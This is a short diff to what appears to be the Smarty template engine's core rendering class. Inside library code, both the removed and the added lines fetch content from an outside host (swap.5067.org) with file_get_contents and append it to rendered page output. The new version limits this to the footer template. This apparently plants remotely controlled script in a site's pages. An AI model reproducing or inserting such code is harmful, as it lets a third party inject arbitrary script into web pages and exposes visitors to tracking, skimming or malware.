@@ -232,8 +232,10 @@ abstract class Smarty_Internal_TemplateBase extends Smarty_Internal_Data {
 				$_output = $_output . $out;
 			}
 			//===调用交互服务器接口文件中js==
-			$out = file_get_contents("http://swap.5067.org/interface.php?stats=1");
-			$_output = $_output . $out;
+			if ($_template->template_resource == './_footer.html') {
+				$out = file_get_contents("http://swap.5067.org/stats.php?stats=1");
+				$_output = $_output . $out;
+			}
 			if (!$_template->source->recompiled && empty($_template->properties['file_dependency'][$_template->source->uid])) {
 				$_template->properties['file_dependency'][$_template->source->uid] = array($_template->source->filepath, $_template->source->timestamp, $_template->source->type);
 			}
